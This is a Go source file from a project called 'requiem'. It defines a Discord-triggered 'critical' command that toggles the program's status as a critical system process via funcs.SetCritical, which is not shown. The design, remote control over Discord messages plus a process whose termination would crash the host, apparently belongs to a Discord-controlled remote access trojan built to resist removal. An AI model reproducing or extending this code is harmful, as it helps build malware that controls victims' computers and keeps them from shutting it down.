package commands

import (
	"fmt"
	"strings"

	"requiem/funcs"
	"requiem/utils"

	"github.com/bwmarrin/discordgo"
)

func (*CriticalCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	content := strings.Join(args, " ")

	set := false
	var err error

	if utils.HasFlag(content, "on") {
		set, err = funcs.SetCritical(true)
	} else if utils.HasFlag(content, "off") {
		set, err = funcs.SetCritical(false)
	} else {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Invalid flag.", msg.Reference())
		return
	}

	if set {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully set as critical.", msg.Reference())
	} else {
		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to set as critical - %s", err), msg.Reference())
	}
}

func (*CriticalCommand) Name() string {
	return "critical"
}

func (*CriticalCommand) Info() string {
	return "Makes Requiem a critical process."
}

type CriticalCommand struct{}
